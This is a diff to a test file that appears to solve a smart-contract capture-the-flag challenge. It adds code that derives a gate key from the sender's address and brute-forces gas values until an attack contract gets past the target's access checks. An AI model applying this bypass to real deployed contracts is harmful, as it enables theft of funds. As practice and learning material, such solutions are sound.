@@ -51,7 +51,19 @@ it("solves the challenge", async () => {
     challenge.address
   );
   await attackContract.deployed();
-  await attackContract.attack();
+  // Get the last 16 bits (4 hex chars) of the eoa for the gateKey
+  const uint16TxOrigin = eoa.address.slice(-4);
+  const gateKey = `0x100000000000${uint16TxOrigin}`;
+
+  const MOD = 8191;
+  const gasToUse = 800000;
+  for (let i = 0; i < MOD; i++) {
+    console.log(`i value: ${JSON.stringify(i)}`);
+    try {
+      await attackContract.attack(gateKey, gasToUse + i, { gasLimit: 950000 });
+      break;
+    } catch {}
+  }
 });
 
 // after(async () => {
